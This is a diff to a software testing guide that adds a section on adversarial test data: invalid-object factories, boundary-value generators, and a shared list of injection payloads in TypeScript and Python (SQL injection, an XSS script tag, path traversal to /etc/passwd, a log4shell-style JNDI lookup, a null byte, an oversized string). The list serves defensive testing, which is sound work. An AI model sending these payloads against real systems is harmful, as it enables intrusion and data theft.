@@ -106,3 +106,78 @@ Before submitting tests, verify:
 - [ ] Dates are in the correct format (ISO 8601) and are logically consistent
 - [ ] Names are human names, not `"Test User"` or `"User 1"`
 - [ ] Quantities and amounts are within valid domain ranges
+
+---
+
+## Adversarial & Malformed Data
+
+The factories above build *valid* objects for happy-path and positive tests. Negative
+tests (see `test/references/test-design.md` §4–§5) need the opposite: data that
+violates a constraint or crosses a trust boundary. Build these from explicit
+`buildInvalid*` / `buildMalformed*` factories so the hostile input is named and
+reusable — never an inline literal in one test.
+
+```typescript
+// tests/factories/order.invalid.ts
+import { buildOrder } from './order';
+
+// One factory per *kind* of violation — an equivalence class, not a single value.
+export const invalidOrders = {
+  missingRequired: () => { const o = buildOrder(); delete (o as any).customerId; return o; },
+  belowMinAmount:  () => buildOrder({ totalAmount: 0 }),          // boundary: min - 1 step
+  aboveMaxAmount:  () => buildOrder({ totalAmount: 1_000_000 }),  // boundary: max + 1 step
+  wrongType:       () => buildOrder({ totalAmount: 'free' as any }),
+  emptyItems:      () => buildOrder({ items: [] }),
+};
+```
+
+### Boundary-value generators
+
+Pair these with the boundary triples from `test-design.md` §2 — for a bound `N`,
+generate `N-1`, `N`, `N+1`:
+
+```typescript
+export const lengths = (min: number, max: number) => [min - 1, min, max, max + 1];
+export const str = (n: number) => 'x'.repeat(Math.max(0, n));   // str(min - 1) → too short
+```
+
+### Injection / trust-boundary payloads
+
+For any field that crosses a trust boundary (request body, query param, header),
+assert the system **rejects or neutralizes** these. Keep them in one shared list so
+every string-input test can iterate the same battery:
+
+```typescript
+// tests/factories/payloads.ts
+export const INJECTION_PAYLOADS = [
+  "' OR 1=1 --",            // SQL injection
+  '<script>alert(1)</script>', // XSS
+  '../../../../etc/passwd',  // path traversal
+  '${jndi:ldap://x/a}',      // template / log4shell-style
+  '\0truncated',         // null byte
+  'x'.repeat(100_000),       // oversized payload (resource exhaustion)
+];
+```
+
+```python
+# tests/factories/payloads.py
+INJECTION_PAYLOADS = [
+    "' OR 1=1 --",
+    "<script>alert(1)</script>",
+    "../../../../etc/passwd",
+    "${jndi:ldap://x/a}",
+    "\x00truncated",
+    "x" * 100_000,
+]
+```
+
+These tests prove runtime behavior; the `security-reviewer` gate reasons about the
+code. Both are required — neither substitutes for the other.
+
+### Adversarial data rules
+
+- One factory per violation *class*, not per bad value — mirrors equivalence partitioning.
+- A malformed factory starts from a valid object and breaks exactly one thing, so the
+  test proves *that* constraint is enforced, not an unrelated failure.
+- Never use a malformed factory in a positive test — keep valid and invalid factories
+  in separate files (`*.ts` vs `*.invalid.ts`) so intent is unambiguous.
